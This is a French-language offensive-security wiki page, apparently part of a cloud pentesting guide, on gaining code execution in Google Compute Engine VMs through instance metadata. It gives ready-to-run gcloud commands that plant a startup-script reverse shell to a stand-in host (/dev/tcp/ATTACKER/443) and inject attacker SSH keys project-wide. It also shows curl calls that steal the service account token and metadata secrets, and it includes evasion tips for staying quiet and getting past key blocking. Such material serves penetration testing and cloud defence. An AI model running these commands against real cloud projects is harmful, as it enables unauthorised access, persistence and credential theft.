---
title: "Métadonnées et SSH : exécution de code via les métadonnées d'instance"
description: "Obtenir un shell sur une VM en écrivant des métadonnées d'instance (startup-script) ou en ajoutant une clé SSH, et lire le serveur de métadonnées depuis l'hôte."
keywords:
  - instance metadata
  - startup script
  - SSH key
  - OS Login
  - GCE
---

# Métadonnées et SSH

Les instances Compute Engine lisent leur configuration dans un store de **métadonnées** par instance et par projet, et l'agent invité fait confiance à deux clés de ce store : `startup-script` (et `startup-script-url`), qui s'exécute en tant que root au démarrage, et `ssh-keys`, que l'agent provisionne dans les utilisateurs autorisés. Avec `compute.instances.setMetadata` (portée instance) ou `compute.projects.setCommonInstanceMetadata` (toutes les instances du projet), chacune de ces clés est une exécution de code ou une connexion.

## Exécuter du code avec un startup script

```bash
# set a startup script, then force it to run by resetting the instance
gcloud compute instances add-metadata <vm> --zone <zone> \
  --metadata startup-script='#! /bin/bash
bash -i >& /dev/tcp/ATTACKER/443 0>&1'
gcloud compute instances reset <vm> --zone <zone>
```

## Ajouter une clé SSH

```bash
# instance-level
gcloud compute instances add-metadata <vm> --zone <zone> \
  --metadata ssh-keys="attacker:$(cat key.pub)"

# project-wide (lands on every instance that does not block project keys)
gcloud compute project-info add-metadata \
  --metadata ssh-keys="attacker:$(cat key.pub)"
```

Là où **OS Login** est imposé, les clés SSH des métadonnées sont ignorées ; ajoutez plutôt votre clé via OS Login (`gcloud compute os-login ssh-keys add`) si vous détenez le rôle IAM, ou repliez-vous sur la voie du startup-script.

## Lire le serveur de métadonnées sur l'hôte

Une fois que vous avez un shell, le serveur de métadonnées renvoie l'identité et la configuration de l'instance :

```bash
# the attached service account's OAuth token
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# project-wide SSH keys, attributes, and any secrets left in custom metadata
curl -s -H 'Metadata-Flavor: Google' \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true
```

## Notes d'exploitation

- `startup-script` ne s'exécute qu'au démarrage : vous devez donc faire un `reset`/`stop`+`start` de l'instance ; c'est perturbant et journalisé, tandis qu'une clé SSH est plus discrète si les clés ne sont pas bloquées.
- `block-project-ssh-keys=true` sur une instance neutralise la voie de la clé à l'échelle du projet ; définissez plutôt une clé au niveau de l'instance.
- Le jeton que vous lisez sur l'hôte est celui du [compte de service](service-account-scope.md) de l'instance, borné par ses portées OAuth ; le détail plus large de la récupération de credentials se trouve sous [métadonnées d'instance](../../credentials/instance-metadata/index.md).

## Outils

- **gcloud** (`compute instances add-metadata`, `project-info add-metadata`, `os-login`).
- **curl** contre `metadata.google.internal` avec l'en-tête `Metadata-Flavor: Google`.

## Références

- [Rhino Security Labs: GCP privilege escalation (part 2)](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/)
- [Hacking the Cloud: GCP](https://hackingthe.cloud/)
- [Google: Compute Engine metadata](https://cloud.google.com/compute/docs/metadata/overview)
